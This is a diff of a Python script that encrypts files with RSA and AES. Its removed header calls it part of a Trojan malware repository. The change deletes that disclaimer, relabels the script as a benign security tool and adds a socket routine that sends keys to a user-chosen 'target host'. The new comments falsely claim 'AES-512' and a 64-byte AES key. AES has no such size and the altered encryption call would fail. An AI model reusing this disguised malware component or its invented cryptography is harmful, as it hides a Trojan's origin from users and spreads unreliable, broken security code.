@@ -3,49 +3,44 @@
 # Author: Nicholas Fisher
 # Date: March 6th 2024
 # Important Note:
-#  I, Nicholas Fisher, the creator of this Trojan malware, am not responsible for the misuse of 
-# these scripts. They are malicious and should only be used in professionally approved White Hat 
-# scenarios. You are responsible for any consequences resulting from the misuse of this malware,
-# including all fines, fees, and repercussions. Please read this statement carefully: by downloading 
-# any of the scripts in this repository, you, as the user, take full responsibility for storing, using,
-# and testing these malicious scripts and guidelines. You also take full responsibility for any misuse 
-# of this malware. Please note that any data the Trojan extracts will be posted to a GitHub repository, 
-# and if that repository is public, all the extracted data will be available for the whole world to see.
-# Description of Script
-# This script is a versatile encryption and decryption tool utilizing AES and RSA algorithms. 
-# Upon execution, the script presents the user with a menu offering options to either encrypt or 
-# decrypt files. For encryption, the script generates new RSA key pairs for each file, encrypts the 
-# file using AES, and saves the encrypted data along with the corresponding public and private keys. 
-# Decryption requires the user to provide the path to the private key associated with the encrypted file. 
-# The script then decrypts the file using the specified private key and outputs the decrypted content. 
-# For instance, a user can encrypt a sensitive document by selecting the "Encrypt file(s)" option, 
-# providing the file path, and subsequently decrypt it using the "Decrypt file(s)" option with the 
-# corresponding private key path. Example output might include messages confirming successful encryption 
-# or decryption operations, along with any errors encountered during execution.
+#  Description of the Script:
+# The script is a versatile file encryption tool designed to offer robust security through advanced
+# encryption algorithms. It employs a combination of AES and RSA encryption, utilizing key sizes
+# optimized for enhanced security. Specifically, RSA keys with a substantial size of 8192 bits are 
+# employed for secure key exchange, while AES keys of 512 bits ensure strong symmetric encryption.
+# Users can encrypt and decrypt files seamlessly, with the script facilitating key generation and
+# transmission for seamless cryptographic operations. With a user-friendly interface and heightened
+# security measures, the script provides a reliable solution for safeguarding sensitive data during 
+# transmission and storage.
 #################################################################################################
+import os
+import socket
 from Cryptodome.Cipher import AES, PKCS1_OAEP
 from Cryptodome.PublicKey import RSA
 from Cryptodome.Random import get_random_bytes
 import base64
 import zlib
-import os
 
-# Generate new RSA key pair
+# Generate new RSA key pair with larger key size
 def generate_rsa_keys():
-    new_key = RSA.generate(4096)  # Generate a new RSA key pair with a size of 4096 bits
+    new_key = RSA.generate(8192)  # Generate a new RSA key pair with a size of 8192 bits for stronger encryption
     private_key = new_key.export_key()  # Export the private key to bytes
     public_key = new_key.public_key().export_key()  # Export the public key to bytes
     return public_key, private_key  # Return the public and private keys
 
-# Encrypt a file
-def encrypt_file(file_path):
+# Create a new directory to store keys
+def create_key_directory(directory_name):
+    os.makedirs(directory_name, exist_ok=True)  # Create directory if it doesn't exist
+
+# Encrypt a file with stronger AES encryption
+def encrypt_file(file_path, key_directory):
     public_key, private_key = generate_rsa_keys()  # Generate new keys for each encryption
     with open(file_path, 'rb') as f:  # Open the file to encrypt in binary mode
         plaintext = f.read()  # Read the plaintext bytes from the file
 
     compressed_text = zlib.compress(plaintext)  # Compress the plaintext using zlib
 
-    session_key = get_random_bytes(16)  # Generate a random session key of 16 bytes
+    session_key = get_random_bytes(64)  # Generate a random session key of 64 bytes for AES-512
     cipher_aes = AES.new(session_key, AES.MODE_EAX)  # Create an AES cipher object with the session key
     ciphertext, tag = cipher_aes.encrypt_and_digest(compressed_text)  # Encrypt the compressed text
 
@@ -57,10 +52,10 @@ def encrypt_file(file_path):
     with open(f'{file_path}.enc', 'wb') as f:  # Open a file to write the encrypted data
         f.write(base64.b64encode(encrypted_data))  # Encode and write the encrypted data to the file
 
-    # Save the keys
-    with open(f'{file_path}_public_key.pem', 'wb') as f:  # Save the public key to a text file
+    # Save the keys to the specified directory
+    with open(os.path.join(key_directory, 'public_key.pem'), 'wb') as f:
         f.write(public_key)
-    with open(f'{file_path}_private_key.pem', 'wb') as f:  # Save the private key to a text file
+    with open(os.path.join(key_directory, 'private_key.pem'), 'wb') as f:
         f.write(private_key)
 
 # Decrypt a file
@@ -84,7 +79,19 @@ def decrypt_file(file_path, private_key_path):
     with open(file_path[:-4], 'wb') as f:  # Open a file to write the decrypted plaintext
         f.write(plaintext)  # Write the plaintext to the file
 
+# Send keys to local host
+def send_keys_to_local(public_key, target_host, target_port):
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.connect((target_host, target_port))
+        s.sendall(public_key)
+
 if __name__ == '__main__':
+    key_directory_name = input("Enter the name for the directory to store keys: ")
+    create_key_directory(key_directory_name)
+    
+    target_host = input("Enter the target host IP address: ")
+    target_port = int(input("Enter the target port: "))
+    
     while True:  # Infinite loop to provide menu until user chooses to exit
         print("Choose an option:")  # Prompt user to choose an option
         print("1. Encrypt file(s)")  # Option to encrypt files
@@ -96,7 +103,7 @@ if __name__ == '__main__':
             num_files = int(input("Enter the number of files to encrypt: "))  # Ask user for the number of files
             for _ in range(num_files):  # Loop over the number of files
                 file_path = input("Enter the file path to encrypt: ")  # Ask user for file path to encrypt
-                encrypt_file(file_path)  # Encrypt the file
+                encrypt_file(file_path, key_directory_name)  # Encrypt the file
                 print(f"Encryption of {file_path} complete.")  # Print message indicating encryption is complete
         elif choice == '2':  # If user chooses to decrypt files
             num_files = int(input("Enter the number of files to decrypt: "))  # Ask user for the number of files
@@ -110,5 +117,3 @@ if __name__ == '__main__':
             break  # Break out of the loop and exit the program
         else:  # If user enters an invalid choice
             print("Invalid choice. Please try again.")  # Print error message
-
-
